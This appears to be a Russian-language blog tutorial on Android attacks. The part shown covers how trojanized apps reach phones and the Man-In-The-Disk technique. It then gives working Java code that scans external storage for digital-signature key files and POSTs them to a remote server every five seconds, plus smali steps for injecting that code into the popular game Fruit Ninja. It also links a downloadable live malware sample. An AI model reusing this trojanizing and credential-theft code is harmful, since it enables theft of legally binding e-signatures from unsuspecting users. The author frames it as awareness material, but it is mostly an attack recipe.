![image](/assets/images/main_logo.png)

# About
  Данный текст разделен на три части. Они не связанны между собой, за исключением того, что все они относятся к андроид приложениям.
  
  Часть 0 -  я расскажу, как можно модифицировать популярную игру для андроида, внедрив свой вредоносный код и использовать это, для Man-In-The-Disk атаки на приложение ЕГОВ/ЕНПФ.
  
  Часть 1 - мы обойдем SSL Pinning на примере приложения mEgov и GetContact.

  Часть 2 - мы поищем фотки ваших друзей по номеру телефона.
  
  Часть 3 - кейлоггер
  
# Часть 0. Заражаем андроид приложение

## Intro

  Допустим, вы используете на своем андроид телефоне приложения, которые используют ЭЦП, для получения различных услуг. С помощью нее, вы совершаете операции, которые имеют юридическую силу. Вы бы не хотели, чтобы кто-то еще имел доступ к вашей ЭЦП и пользовался ей вместо вас. Представьте, что в один прекрасный день, вы узнаете о том, что кто-то все же воспользовался ею. Вы задаетесь вопросом - как это могло произойти? Анализируете все свои последние действия. Свой телефон в руки никому не давали и нигде не оставляли/забывали. Никаких мутных программ на телефон не ставили.

  Ответ простой - вы скачали безобидное приложение, которое было модифицировано злоумышленником. Или же ваш ребенок, который иногда берет ваш телефон, установил какую-нибудь игру. 
  
  Цель - показать, как просто злоумышленник может модифицировать любое приложение, внедрив туда вредоносный код. И как важно относится к разрешениям, которые вы даете приложениям на телефоне.
  
  Внедрить можно любой функционал - запись с микрофона, фото с камеры, получение контактов/смс/паролей от бразуера и т.д. Мы будем внедрять код, который сканирует память телефона, ищет ЭЦП и отсылает на сервер. Для убедительности, внедряться будем в популярное приложение [Fruit Ninja](https://play.google.com/store/apps/details?id=com.halfbrick.fruitninjafree) (более 100 млн. скачиваний). В начале разберемся, как в теории, наше вредоносное приложение можно доставить пользователю.
  
## Как вредоносные приложения попадают на телефон
 
### Локальные маркеты приложений Китая, Ирана и т.д
 
  Примеры: cafebazaar.ir, android.myapp.com, apkplz.net
  
  Данные площадки появились вследствии цензуры и блокировки Google сервисов. Обычно они содержат местные аналоги популярных приложений и их модификации. Такие модификации содержат якобы новые, крутые фичи, как [этот](https://apkplz.net/app/org.ir.talaeii) иранский телеграм. Однажды, я изучал одну иранскую малварь ([результат Virustotal](https://www.virustotal.com/gui/file/1e6a821f5de824b91c6676742a521a8dcdd345f25a820befa11e5975fc8c39d3/community)), которая сканила телефон на наличие приложений-клонов телеграма и делала нехорошие вещи. Список был следующим, что говорит о реальной популярности всех этих клонов (скачать приложение можете [тут](/assets/files/iranian_apk_infected.zip), пароль:infected):
  
  ```
  "com.hanista.mobogram"
  "org.ir.talaeii"
  "ir.hotgram.mobile.android"
  "ir.avageram.com"
  "org.thunderdog.challegram"
  "ir.persianfox.messenger"
  "com.telegram.hame.mohamad"
  "com.luxturtelegram.black"
  "com.talla.tgr"
  "com.mehrdad.blacktelegram"
  ```
 Сколько телеграмов видите в Top downloads? ([Источник](https://cafebazaar.ir))
  
  ![image](/assets/images/iran_telegrams.png)
  
  Чем плохи модификации популярных приложений? Вы никогда не знаете, что они на самом деле делают. К тому же, правительство не упускает возможность и публикуют свои модификации, естественно с инструментами для слежения за пользователем. Приложения с правительственной слежкой являются вредоносными по определению. [Здесь](https://cybershafarat.com/2016/01/20/farsitelegram/) можете почитать, как спалились иранские власти. Цитата оттуда:
  
> This looks to be developed to the specifications of the Iranian government enabling them to track every bit and byte put forward by users of the app.  
  
  А [Здесь](https://thehackernews.com/2016/11/hacking-android-smartphone.html) спалились китайцы. Цитата:
  
> Besides sniffing SMS message content, contact lists, call logs, location data and other personal user information and automatically sending them to AdUps every 72 hours, AdUps' software also has the capability to remotely install and update applications on a smartphone.
  
  Обычным пользователям защититься от такого практически невозможно, так как другого выбора нет - официальные источники усиленно блокируются, либо приложения предустанавливаются на все ввозимые телефоны. 
  
  И не сказать, что такие маркеты непопулярны, как вам 260 000 000 пользователей в месяц? ([Источник](https://www.appinchina.co/market/app-stores/))
  
  ![image](/assets/images/china_app_stores.png)
  
### Фишинг
Классический фишинг, только вместо загрузки непонятных скриптов или файлов, пользователю предлагают обновить WhatsApp, установить новый улучшенный Instagram, установить антивирус и т.д. Примеры:

![img](/assets/images/whatsapp_fishing.png)

[Источник](https://xakep.ru/2017/01/27/mobile-phishing/)

![img](/assets/images/fishing_2.jpg)

[Источник](https://android.stackexchange.com/questions/106899/what-should-i-do-about-this-pop-up-on-my-android-device)

> I then open CHROME BROWSER and type: www.XXXXXXXX.com - within a few seconds I get a popup with this: 

![img](/assets/images/fishing_3.png)

[Источник](https://www.bleepingcomputer.com/forums/t/576156/android-pop-uphijacker/)

### Телеграм боты/группы

Пример: @apkdl_bot, t.me/fun_android

  Вместо легитимного приложения, вам могут подсунуть вредоносное. Либо заразить запрашиваемое вами приложение "на лету". Работает это так - вы вводите команду боту/в группу, что хотите скачать "Instagram". Скрипт на другой стороне скачивает его с Google Play, распаковывает, запихивает свой вредоносный код, запаковывает обратно и возвращает вам. Как это делать автоматически, я попытаюсь рассказать в ближайшем будущем.

### Сторонние сайты-посредники
 
 Пример: apkpure.com, apkmirror.com, apps.evozi.com/apk-downloader/
 
 Тоже самое, что и с телеграм ботами/группами, только добавляется возможность загрузить свое приложение на такой сайт. Это в свою очередь только увеличивает вероятность установить вредоносное приложение. Пример загрузки на [этом сайте](https://www.apkmirror.com/#uploadAPK):
 
 ![img](/assets/images/apkmirror_submit.png)
   
  Один из примеров малвари, которая распостранялась таким образом ([Источник](https://www.cmcm.com/blog/en/security/2015-09-18/799.html)):
  
  ![img](/assets/images/how_ghost_push_work.jpg)
  
  Примерную статистику, для неофициальных источников, можно найти в [Android Security Report 2018](https://source.android.com/security/reports/Google_Android_Security_2018_Report_Final.pdf) - 1.6 миллиардов заблокированных Google Play Protect установок не из Google Play. Всего установок было гораздо больше.
  
### Google play
 
 Официальный источник приложений имеет защиту от подозрительных приложений, под названием Google Play Protect, которая использует машинное обучение для определения степени вредоносности. Но такая защита не в состоянии точно понять, какое приложение вредоносное, а какое нет, так как для этого требуется полная ручная проверка. Чем отличается шпионское приложение, которое мониторит все ваши передвижения, от фитнес приложения для бега? Исследователи каждый месяц [находят](https://www.zdnet.com/article/android-security-flashlight-apps-on-google-play-infested-with-adware-were-downloaded-by-1-5m-people/) [сотнями](https://www.zdnet.com/article/google-malware-in-google-play-doubled-in-2018-because-of-click-fraud-apps/) [зараженные](https://www.express.co.uk/life-style/science-technology/1143651/Android-warning-malware-Google-Play-Store-security-June-23) приложения, опубликованные в Google Play.
  
  Обычно малварь называет себя *google play services* или схожим образом и ([ставит такую же иконку](https://www.zdnet.com/article/this-trojan-masquerades-as-google-play-to-hide-on-your-phone)) . Почему гугл плей не проверяет иконку на схожесть со своими официальными приложениями - непонятно. Однажды в телеграме, я поставил аватарку с бумажным самолетиком и меня заблокировали. Еще один способ, используемый для публикации в Google Play, состоит в создании схожего имени, с заменой буквы "L" на "I", "g" на "q" и т.д:
  
  
  ![image](/assets/images/spoil_name.png) 
  
  [Источник](https://ti.360.net/blog/articles/stealjob-new-android-malware-used-by-donot-apt-group-en/). 
  
  Тем самым, вы по ошибке можете скачать не то приложение, которое хотели и оно в свою очередь, сворует все ваши контакты и поставит еще много чего вам на телефон. 

### Другие способы

1. [Установка малвари в сервисах починки телефонов](https://www.thesun.co.uk/tech/4298260/smartphone-screen-repair-shops-could-let-spies-into-your-phone/)

2. [При пересечении границы](https://www.theguardian.com/world/2019/jul/02/chinese-border-guards-surveillance-app-tourists-phones)

3. Подключение к незнакомому компьютеру по USB, с включенным режимом отладки. 

4. Получение злоумышленником доступа к вашему гугл аккаунту, и установка приложения на телефон через Google Play. 

### Вывод

Теперь мы поняли, что наше зараженное приложение может попасть на телефон пользователя множеством способов. Теперь о способе атаки, для получения ЭЦП. 

### Man-In-The-Disk

Проблема стара как мир. Общественность обратила на нее внимание, после этой [статьи](https://blog.checkpoint.com/2018/08/12/man-in-the-disk-a-new-attack-surface-for-android-apps/). Советую, для начала, ее прочитать.

*Для тех кто прочитал статью выше. В исследовании не развили мысль о том, что эти файлы обрабатываются простыми библиотеками, в которых можно найти уязвимость и скрафтить такие файлы, которые ее проэксплуатируют.*

Кто не прочитал, расскажу в кратце. Для начала, определимся с понятиями. В андроиде память разделяется на Internal Storage и External Storage. Internal storage - это внутренняя память приложения, доступная только ему и никому больше. Абсолютно каждому приложению на телефоне соответствует отдельный пользователь и отдельная папка с правами только для этого пользователя. Это отличный защитный механизм. External storage - основная память телефона, доступная всем приложениям (сюда же относится SD карта). Зачем она нужна? Возьмем приложение фоторедактор. После редактирования, вы должны сохранить фото, чтобы оно было доступно из галереи. Естественно, что если вы положите его в internal storage, то никому, кроме вашего приложения оно доступно не будет. Или бразуер, который скачивает все файлы в общую папку Downloads.

У каждого андроид приложения есть свой набор разрешений, которые оно запрашивает. Но с ними все не так хорошо. Среди них есть такие, на которые люди охотно закрывают глаза и не относятся серъезно. Среди них - READ_EXTERNAL_STORAGE. Оно позволяет приложению получать доступ к основной памяти телефона, а значит и ко всем данным других приложений. Никто ведь не удивиться, если приложение "блокнот" запросит данное разрешение. Мало ли, вдруг оно там настройки хранит и кэш. Манипуляция данными других приложений в external storage и есть атака Man-In-The-Disk. Другое, почти дефолтное, разрешение - INTERNET. Как видно из названия, оно позволяет приложению иметь доступ в сеть. Самое печальное, что пользователю не показывается специальное окно с просьбой дать это разрешение. Вы просто прописываете его в своем приложении и всё. Именно два этих разрешения нужны для проведения нашей атаки. С помощью READ_EXTERNAL_STORAGE мы будем брать файл, с помощью INTERNET - отправлять.

(здесь исследование разрешений 15-ти топовых приложений)

  Небольшое отступление - если поставить whatsapp на рутованый телефон, то все ваши переписки хранятся в external storage незашифрованными. Видимо whatsapp не считает нужным даже использовать шифрование, на таком "порченом" телефоне. А на нерутованом, там лежит SSLSessionCache и переписки в зашифрованном виде, которые без труда можно расшифровать. Грубо говоря, практически любое приложение имеет доступ ко всем ваших сообщениям WhatsApp.   

Если вы все еще считаете, что это бесперспективный и слабый вектор, то гугл так не считает. Гугл специально для этого изменил READ_EXTERNAL_STORAGE, Кому интересно, читаем [здесь](https://developer.android.com/preview/privacy/scoped-storage?hl=ru). Цитата:

> In order to access any other file that another app has created, including files in a "downloads" directory, your app must use the Storage Access Framework, which allows the user to select a specific file. 

Теперь мы решили все вопросы с доставкой нашего зараженного приложения и то, какой вектор оно будет эксплуатировать. 

## Пишем сканер External Storage

Напомню: нам необходимо заразить игру Ninja Fruit своим кодом, который будет сканировать external storage, искать там ЭЦП и отсылать на сервер. Для этого, в начале, нам надо написать сам сканер. 

Он состоит из трех основных классов: ```StageAttack```, ```MaliciousService```, ```MaliciousTaskManager```. На MainActivity не обращайте внимание, оно нужно было лишь для быстрого тестирования.

![img](assets\images\sign_scan\prj_struct.png)

```StageAttack``` - состоит из одного статического метода. Именно с него начинается наша атака, именно он запускает все дальнейшие процедуры и вызов именно его мы будем инжектить во Fruit Ninja. Метод лишь запускает наш сервис.

{% highlight java %}
public class StageAttack {

    public static void pwn(Context ctx) {
        Log.d("MalService", "Staging our attack...");
        Log.d("MalService", "Attacking every 5 seconds...");
        Intent intent = new Intent(ctx,  MaliciousService.class);
        ctx.startService(intent);
    }
}

{% endhighlight %}

```MaliciousService``` - сервис, который переодически сканирует external storage на предмет ЭЦП. Если находит, отсылает на сервер. Делает это, даже если приложение закрыть.

Рекурсивно осуществляем поиск по всему external storage:

{% highlight java %}
private String pwn2(File dir) {

        String path = null;
        try {

            File[] list = dir.listFiles();

            if (list == null) {
                Log.d(TAG, "list is null!");
                return null;
            }

            for (File f : list) {

                if (!containsSymlink(f)) {

                    if (f.isDirectory()) {
                        path = pwn2(f);
                        if (path != null)
                            return path;
                    } else {
                        path = f.getAbsolutePath();
                        if (path.contains("AUTH_RSA")) {
                            Log.d(TAG, "AUTH_RSA found here - " + path);
                            return path;
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, e.getMessage());
        }
        return null;
    }
{% endhighlight %}

Если ЭЦП не найдено, мы планируем повторить тоже самое через 5 секунд. Мы должны использовать именно класс ```AlarmManager``` и планировать методом ```setExactAndAllowWhileIdle```, так как это единственный способ планирования задач, с высокой точностью, в актуальном андроиде.

{% highlight java %}
private void scheduleMalService() {

        Context ctx = getApplicationContext();
        AlarmManager alarmMgr = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
        Intent intent = new Intent(ctx, MaliciousTaskManager.class);

        final int _id = (int) System.currentTimeMillis();
        PendingIntent alarmIntent = PendingIntent.getBroadcast(ctx, _id, intent, 0);

        alarmMgr.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() +
                5000, alarmIntent);
    }
{% endhighlight %}

Если ЭЦП найдено, то мы отправляем файл на сервер:

{% highlight java %}
private void sendToServer(String path) {
        Log.d(TAG, "Sending p12 file to server");
        try {
            File file = new File(path);
            URL url = new URL("http://xxxxxxxxxx");
            HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
            urlConnection.setConnectTimeout(30 * 1000);

            urlConnection.setRequestMethod("POST");
            urlConnection.setDoOutput(true);
            urlConnection.setRequestProperty("Content-Type", "application/octet-stream");

            DataOutputStream request = new DataOutputStream(urlConnection.getOutputStream());
            request.write(readFileToByteArray(file));
            request.flush();
            request.close();

            int respCode = urlConnection.getResponseCode();
            Log.d(TAG, "Return status code: " + respCode);

        } catch (Exception e) {
            Log.d(TAG, e.getMessage());
        }
    }
{% endhighlight %}

Наш код готов, а значит пора его внедрять. Внедрять будем в основной Activity, мы ведь хотим, чтобы наш код запускался при открытии приложения. Для этого этот Activity нужно найти. Декомпилируем, с помощью ```apktool```, приложение Fruit Ninja. Желательно выбирать приложение, у которого уже есть разрешения READ_EXTERNAL_STORAGE и INTERNET, иначе придется добавлять код на их запрос у пользователя, благо найти такое приложение не составляет труда. После декомпиляции, открываем манифест, и ищем Activity, которые запускается при старте. Найти его можно по intent фильтру:

{% highlight xml %}
<intent-filter>
  <action android:name="android.intent.action.MAIN"/>
  <category android:name="android.intent.category.LAUNCHER"/>
</intent-filter>
{% endhighlight %}

Видим полное имя класса Activity - ```com.halfbrick.mortar.MortarGameLauncherActivity```. Открываем папку с декомплириованными исходниками, ищем там этот класс, открываем его. Он содержит только один метод (помимо самого конструктора):

```smali
# virtual methods
.method protected onStart()V
```

Далее метод ```onStart():```
```smali
# virtual methods
.method protected onStart()V
    .locals 2

    .line 33
    invoke-super {p0}, Landroid/app/Activity;->onStart()V // Вызываем родительский метод onStart(), стандартная процедура

    .line 35
    invoke-virtual {p0}, Lcom/halfbrick/mortar/MortarGameLauncherActivity;->isTaskRoot()Z // Проверяем, является ли наш активити главным //на экране

    move-result v0

    if-nez v0, :cond_0

    .line 37
    invoke-virtual {p0}, Lcom/halfbrick/mortar/MortarGameLauncherActivity;->finish()V // Если нет, то закрываемся

    return-void

    .line 41
    :cond_0
    new-instance v0, Landroid/content/Intent; // Создаем Intent

    const-class v1, Lcom/halfbrick/mortar/MortarGameActivity; // в v1 кладем класс MortarGameActivity
    
    // Создаем Intent, с классом MortarGameActivity
    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V 
  
    // Закрываем текущий активити
    .line 42
    invoke-virtual {p0}, Lcom/halfbrick/mortar/MortarGameLauncherActivity;->finish()V
    
    // Открываем MortarGameActivity
    .line 43
    invoke-virtual {p0, v0}, Lcom/halfbrick/mortar/MortarGameLauncherActivity;->startActivity(Landroid/content/Intent;)V

    return-void
.end method
```

Выяснили, что открывается MortarGameActivity. Открываем его. Смотрим метод ```Oncreate```, так как с него начинается любое активити.
Куда-то сюда нам надо вставить вызов нашего кода. Вставлять надо так, чтобы сохранить порядок line. Стрелочкой показано, куда будем вставлять

```smali
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 9

    :try_start_0
    const-string v0, "android.os.AsyncTask"

    .line 465
    invoke-static {v0}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    .line 471
    :catch_0
    invoke-super {p0, p1}, Landroid/support/v4/app/FragmentActivity;->onCreate(Landroid/os/Bundle;)V
    
	  <------------------------------------------- вставлять будем сюда, как строку 472
    
    .line 473
    invoke-static {}, Lcom/halfbrick/mortar/NativeGameLib;->TryLoadGameLibrary()Z

    .line 475
    invoke-virtual {p0}, Lcom/halfbrick/mortar/MortarGameActivity;->getIntent()Landroid/content/Intent;
```

Куда вставлять нашли, теперь нужен smali код того, что хотим вставить. Собираем в apk наш сканер и декомпилируем. Переносим наши три класса в папку com/halfbrick/mortar (там же, где лежит активити целевая). Меняем им package name с kz.c.signscan на com.halfbrick.mortar. 

(Вставить много красивых картинок! Типа, какой был код и какой стал)

В smali классе MainActivity берем строчку вызова StageAttack->pwn(). Копируем ее и вставляем в MortarGameActivity, в то место, которое мы определили. Добавляем в manifest наш ресивер и сервис.
```
<receiver android:name=".MaliciousTaskManager"/>
<service android:name=".MaliciousService"/>
```

Запаковываем все обратно и подписываем (тут со стековерфлоу взять команды и написать че к чему). И видеодемонстрация!
